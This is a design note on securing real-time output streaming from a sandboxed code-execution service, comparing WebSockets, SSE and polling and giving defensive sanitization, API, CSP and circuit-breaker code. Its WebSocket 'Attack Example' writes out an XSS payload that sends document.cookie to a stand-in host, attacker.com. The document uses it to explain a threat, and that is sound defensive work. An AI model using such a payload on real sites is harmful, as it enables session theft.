# Security Considerations for Real-Time Output Streaming

## Overview

When implementing real-time monitoring of code execution processes, the communication channel itself becomes a potential attack vector. This document analyzes the security implications of different approaches.

## Threat Model

### Assumptions
- The code execution environment may be compromised by malicious user code
- A compromised container could attempt to exploit the monitoring channel
- The goal is to prevent compromise from propagating upstream to the API or frontend

### Attack Scenarios
1. **Output Injection**: Malicious code injects control sequences or payloads into stdout/stderr
2. **Channel Hijacking**: Compromised process attempts to take control of the communication channel
3. **Resource Exhaustion**: Flooding output to overwhelm monitoring systems
4. **Privilege Escalation**: Using the monitoring channel to gain higher privileges

## Communication Methods Analysis

### 1. WebSockets (Bidirectional) - HIGH RISK ⚠️

**Risks:**
- Persistent bidirectional channel provides maximum attack surface
- Compromised container can send commands upstream
- If API is compromised via WebSocket, attacker has persistent channel to frontend
- Difficult to implement proper request/response isolation
- Connection hijacking enables ongoing communication

**Attack Example:**
```python
# Malicious code in container
import sys
# Attempt to send control commands upstream
sys.stdout.write("\x1b]1337;RemoteHost=attacker.com\x07")
# Or inject JavaScript if output is rendered
sys.stdout.write("<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>")
```

### 2. Server-Sent Events (Unidirectional) - MEDIUM RISK ⚠️

**Risks:**
- One-way channel limits but doesn't eliminate attacks
- Still vulnerable to payload injection
- Continuous stream makes sanitization challenging
- Can't receive commands but can still exfiltrate data

**Advantages over WebSockets:**
- No bidirectional communication
- Simpler to audit data flow
- Standard HTTP, easier to apply security policies

### 3. Enhanced Polling - LOW RISK ✅

**Risks:**
- Minimal - each request is isolated
- Still must sanitize output data

**Advantages:**
- Stateless requests are easier to validate
- Built-in rate limiting via polling interval
- Output passes through multiple defensive layers
- No persistent connections to maintain
- Easy to implement circuit breakers

## Recommended Architecture: Smart Polling with React Query

### Why React Query?
1. **Security**: Maintains request isolation of polling
2. **Efficiency**: Deduplicates requests, smart caching
3. **Reliability**: Built-in retry logic, error boundaries
4. **UX**: Optimistic updates, background refetching

### Implementation Strategy

```typescript
// Secure polling configuration
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      // Refetch on window focus for fresh data
      refetchOnWindowFocus: true,
      // Retry failed requests with backoff
      retry: 3,
      retryDelay: attemptIndex => Math.min(1000 * 2 ** attemptIndex, 30000),
      // Stale time to reduce unnecessary requests
      staleTime: 5000,
      // Cache time for background updates
      cacheTime: 10 * 60 * 1000, // 10 minutes
    },
  },
})

// Example secure output fetching
function useEvaluationOutput(evalId: string) {
  return useQuery({
    queryKey: ['evaluation', evalId, 'output'],
    queryFn: async () => {
      const response = await fetch(`/api/eval/${evalId}/output`, {
        headers: {
          'X-Output-Format': 'sanitized', // Request pre-sanitized output
        },
      })
      const data = await response.json()
      // Additional client-side sanitization
      return sanitizeOutput(data)
    },
    // Poll while running
    refetchInterval: (data) => {
      if (data?.status === 'running') return 1000
      return false
    },
  })
}
```

## Defense in Depth Strategies

### 1. Output Sanitization Pipeline

```python
# Server-side sanitization
def sanitize_output(raw_output: str) -> str:
    # Remove ANSI escape sequences
    output = remove_ansi_codes(raw_output)
    
    # Strip control characters (except \n, \t)
    output = ''.join(char for char in output if char.isprintable() or char in '\n\t')
    
    # Limit line length
    lines = output.split('\n')
    output = '\n'.join(line[:1000] for line in lines[:1000])  # Max 1000 lines, 1000 chars each
    
    # Validate UTF-8
    output = output.encode('utf-8', errors='replace').decode('utf-8')
    
    return output
```

### 2. API Security Layers

```python
# Separate read-only endpoint for output
@router.get("/eval/{eval_id}/output")
@require_auth(permissions=["eval:read"])
@rate_limit(calls=10, period=timedelta(seconds=1))
async def get_evaluation_output(
    eval_id: str,
    last_line: Optional[int] = None,
    format: Literal["raw", "sanitized"] = "sanitized"
):
    # Only read from Redis, no execution
    output = await redis_client.get(f"eval:{eval_id}:output")
    
    if format == "sanitized":
        output = sanitize_output(output)
    
    # Return incremental updates
    lines = output.split('\n')
    if last_line is not None:
        lines = lines[last_line:]
    
    return {
        "lines": lines,
        "total_lines": len(lines),
        "truncated": len(output) > MAX_OUTPUT_SIZE
    }
```

### 3. Frontend Security

```typescript
// Safe output rendering
function OutputDisplay({ output }: { output: string }) {
  // Never use dangerouslySetInnerHTML
  return (
    <pre className="output-container">
      <code>
        {/* Text content is automatically escaped by React */}
        {output}
      </code>
    </pre>
  )
}

// Content Security Policy headers
const cspHeaders = {
  'Content-Security-Policy': [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "connect-src 'self'",
    "frame-src 'none'",
    "object-src 'none'",
  ].join('; ')
}
```

### 4. Rate Limiting and Circuit Breakers

```python
# Implement circuit breaker for output streaming
class OutputCircuitBreaker:
    def __init__(self, failure_threshold=5, timeout=60):
        self.failure_count = 0
        self.failure_threshold = failure_threshold
        self.timeout = timeout
        self.last_failure = None
        self.is_open = False
    
    def record_success(self):
        self.failure_count = 0
        self.is_open = False
    
    def record_failure(self):
        self.failure_count += 1
        self.last_failure = time.time()
        if self.failure_count >= self.failure_threshold:
            self.is_open = True
    
    def can_proceed(self):
        if not self.is_open:
            return True
        if time.time() - self.last_failure > self.timeout:
            self.is_open = False
            self.failure_count = 0
            return True
        return False
```

## Implementation Priorities

1. **Phase 1**: Implement React Query for existing endpoints
   - Replace custom polling logic
   - Add proper error handling
   - Implement caching strategy

2. **Phase 2**: Add secure output endpoint
   - Read-only access to Redis
   - Comprehensive sanitization
   - Incremental updates support

3. **Phase 3**: Enhanced monitoring features
   - Resource usage stats
   - Process lifecycle events
   - Aggregated metrics

## Security Checklist

- [ ] All output is sanitized server-side before storage
- [ ] Additional sanitization at API layer
- [ ] Frontend treats all output as untrusted text
- [ ] Rate limiting on all endpoints
- [ ] Circuit breakers for failure scenarios
- [ ] Separate auth tokens for read-only operations
- [ ] Content Security Policy headers configured
- [ ] No eval() or innerHTML usage
- [ ] Output size limits enforced
- [ ] Audit logging for all access

## Conclusion

While WebSockets and SSE offer real-time capabilities, the security risks for evaluation infrastructure are significant. Smart polling with React Query provides the best balance of:
- Security (request isolation)
- Performance (intelligent caching)
- User experience (background updates)
- Maintainability (standard HTTP)